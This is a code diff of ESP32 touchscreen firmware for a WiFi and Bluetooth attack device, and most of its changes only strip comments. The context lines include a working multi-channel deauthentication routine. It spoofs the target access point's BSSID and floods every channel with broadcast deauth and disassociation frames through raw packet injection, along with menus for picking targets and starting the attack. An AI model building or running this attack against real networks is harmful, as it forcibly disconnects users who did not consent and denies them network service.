@@ -69,7 +69,7 @@ Button btSubMenuButtons[] = {
   {buttonMarginX, 210, buttonWidth, buttonHeight, "Back to Main Menu", TFT_RED}
 };
 
-// Hardware objects
+
 TFT_eSPI tft = TFT_eSPI();
 XPT2046_Touchscreen ts(TOUCH_CS);
 
@@ -82,7 +82,7 @@ int wifiAttackScrollOffset = 0;
 int wifiAttackHighlightIndex = 0;
 bool wifiAttackBackButtonSelected = false;
 
-// Separate highlight indices for different menus
+
 int mainMenuHighlightIndex = 0;
 int wifiSubMenuHighlightIndex = 0;
 int wifiScanResultsHighlightIndex = 0;
@@ -312,7 +312,7 @@ void drawWiFiAttackMenu() {
     tft.print("Multi-channel hopping");
   }
 
-  // Clamp highlight index
+ 
   int totalItems = scannedNetworkCount + 1; // +1 for back button
   if (wifiAttackHighlightIndex >= totalItems && totalItems > 0) {
     wifiAttackHighlightIndex = totalItems - 1;
@@ -321,7 +321,7 @@ void drawWiFiAttackMenu() {
     wifiAttackHighlightIndex = 0;
   }
 
-  // Determine if back button is selected
+ 
   wifiAttackBackButtonSelected = (wifiAttackHighlightIndex >= scannedNetworkCount);
 
   int startIdx = wifiAttackScrollOffset;
@@ -379,8 +379,8 @@ void drawWiFiScanResults() {
   tft.setCursor(60, 10);
   tft.print("WiFi Networks");
   
-  // Clamp highlight index
-  int totalItems = scannedNetworkCount + 1; // +1 for back button
+  
+  int totalItems = scannedNetworkCount + 1;
   if (wifiScanResultsHighlightIndex >= totalItems && totalItems > 0) {
     wifiScanResultsHighlightIndex = totalItems - 1;
   }
@@ -489,7 +489,7 @@ void drawBLEScanResults() {
   drawStatus(("Found " + String(btCount) + " BLE devices").c_str());
 }
 
-// TOUCH HANDLERS WITH ENHANCED NAVIGATION
+// TOUCH HANDLERS
 
 void handleMainMenuTouch(int x, int y) {
   int section = y / (screenHeight / 3);
@@ -582,7 +582,7 @@ void handleBTSubMenuTouch(int x, int y) {
 // Enhanced WiFi Attack Touch Handler
 void handleWiFiAttackTouch(int x, int y) {
   int section = y / (screenHeight / 3);
-  int totalItems = scannedNetworkCount + 1; // +1 for back button
+  int totalItems = scannedNetworkCount + 1;
 
   switch (section) {
     case 0: // DOWN (inverted)
@@ -635,7 +635,7 @@ void handleWiFiScanResultsTouch(int x, int y) {
         drawWiFiSubMenu();
       }
       break;
-    case 2: // UP (inverted)
+    case 2: 
       if (wifiScanResultsHighlightIndex > 0) wifiScanResultsHighlightIndex--;
       if (wifiScanResultsHighlightIndex < wifiScanResultsScrollOffset) wifiScanResultsScrollOffset--;
       if (wifiScanResultsScrollOffset < 0) wifiScanResultsScrollOffset = 0;
@@ -673,7 +673,7 @@ void handleBLEScanResultsTouch(int x, int y) {
 
 // Main touch handler with deauth stop on any touch
 void handleTouch(int x, int y) {
-  // PRIORITY CHECK: If deauth is active, ANY touch stops it
+
   if (deauthActive) {
     stopWiFiDeauth();
     drawWiFiAttackMenu();
@@ -712,10 +712,10 @@ void handleTouch(int x, int y) {
   }
 }
 
-// WiFi Async Scan - MODIFIED WITH DISCONNECT
+// WiFi Async Scan 
 void startWiFiScan() {
-  WiFi.disconnect(true);  // Force disconnect and clear credentials
-  delay(100);             // Small delay to ensure disconnection
+  WiFi.disconnect(true);  
+  delay(100);             
   
   scannedNetworkCount = 0;
   wifiScanInProgress = true;
@@ -818,10 +818,10 @@ void stopBLEBeacon() {
   Serial.println("[BLE] Beacon stopped");
 }
 
-// Multi-Channel WiFi Deauth Functions - MODIFIED WITH DISCONNECT
+// Multi-Channel WiFi Deauth Functions
 void startWiFiDeauth(String ssid) {
-  WiFi.disconnect(true);  // Force disconnect and clear credentials
-  delay(100);             // Small delay to ensure disconnection
+  WiFi.disconnect(true); 
+  delay(100);            
   
   targetSSID = ssid;
   deauthActive = true;
@@ -838,12 +838,12 @@ void stopWiFiDeauth() {
   deauthActive = false;
   deauthScanInProgress = false;
   targetSSID = "";
-  currentChannelIndex = 0;  // Reset channel index
+  currentChannelIndex = 0;
   drawStatus("Deauth stopped");
   Serial.println("[DEAUTH] Multi-channel attack stopped");
 }
 
-// ENHANCED Multi-Channel Deauth Handler
+
 void handleDeauth() {
   // Handle async scan for deauth target
   if (deauthScanInProgress) {
@@ -878,11 +878,11 @@ void handleDeauth() {
 
   if (!deauthActive || targetSSID.length() == 0 || !targetFound) return;
 
-  // MULTI-CHANNEL ENHANCED ATTACK
+  // MULTI-CHANNEL ATTACK
   if (millis() - lastDeauthTime >= deauthInterval) {
     lastDeauthTime = millis();
     
-    // Cycle through multiple channels rapidly
+    // Cycle through multiple channels
     for (int ch = 0; ch < channelCount; ch++) {
       // Set channel
       esp_wifi_set_promiscuous(false);
@@ -892,15 +892,15 @@ void handleDeauth() {
       // Send packet burst on this channel
       for (int i = 0; i < (deauthPacketCount / channelCount); i++) {
         // Deauth packet
-        memset(&deauthPacket[4], 0xFF, 6);              // Destination: broadcast
-        memcpy(&deauthPacket[10], targetBSSID, 6);      // Source: AP BSSID
-        memcpy(&deauthPacket[16], targetBSSID, 6);      // BSSID: AP BSSID
+        memset(&deauthPacket[4], 0xFF, 6);             
+        memcpy(&deauthPacket[10], targetBSSID, 6);     
+        memcpy(&deauthPacket[16], targetBSSID, 6);     
         esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), true);
         
-        // Disassoc packet  
-        memset(&disassocPacket[4], 0xFF, 6);            // Destination: broadcast
-        memcpy(&disassocPacket[10], targetBSSID, 6);    // Source: AP BSSID
-        memcpy(&disassocPacket[16], targetBSSID, 6);    // BSSID: AP BSSID
+        
+        memset(&disassocPacket[4], 0xFF, 6);          
+        memcpy(&disassocPacket[10], targetBSSID, 6);   
+        memcpy(&disassocPacket[16], targetBSSID, 6);  
         esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), true);
         
         delayMicroseconds(25);  // Very short delay for rapid transmission
@@ -914,9 +914,9 @@ void handleDeauth() {
   }
 }
 
-// Scan Networks Menu - MODIFIED WITH DISCONNECT
+// Scan Networks Menu 
 void scanNetworksMenu() {
-  WiFi.disconnect(true);  // Force disconnect before simultaneous scan
+  WiFi.disconnect(true); 
   delay(100);
   
   tft.fillScreen(TFT_BLACK);
@@ -933,7 +933,7 @@ void scanNetworksMenu() {
   scanNetworksTimeout = millis();
 }
 
-// Handle non-blocking delays
+
 void handleBLEOperationDelay() {
   if (bleOperationInProgress && millis() - bleOperationStart >= 1200) {
     bleOperationInProgress = false;
@@ -950,7 +950,7 @@ void handleStatusMessage() {
   }
 }
 
-// Setup and Loop
+
 void setup() {
   Serial.begin(115200);
   delay(1000);
@@ -975,7 +975,7 @@ void setup() {
   Serial.println("Touch: Initialized");
 
   WiFi.mode(WIFI_STA);
-  WiFi.disconnect(true);  // Force disconnect and clear credentials
+  WiFi.disconnect(true); 
   delay(100);
   esp_wifi_set_promiscuous(true);
   Serial.println("WiFi: Packet injection ready");
